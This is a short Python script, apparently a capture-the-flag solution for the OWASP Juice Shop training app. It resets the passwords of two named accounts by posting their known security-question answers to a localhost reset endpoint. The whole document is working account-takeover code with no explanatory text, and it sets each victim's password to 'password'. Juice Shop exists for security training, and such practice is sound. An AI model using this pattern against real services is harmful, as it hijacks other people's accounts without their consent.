import requests

resets = {"bender@juice-sh.op": "Stop'n'Drop", "bjoern@owasp.org": "Zaya"}
myobj = {"email": "", "answer": "", "new": "password", "repeat": "password"}
url = "http://localhost:3000/rest/user/reset-password"

for i in resets.keys():
    myobj["email"]=i
    myobj["answer"]=resets[i]
    x = requests.post(url, data=myobj)
    if x.status_code == 200:
        print(f"Successfully reset {i} password to : password")
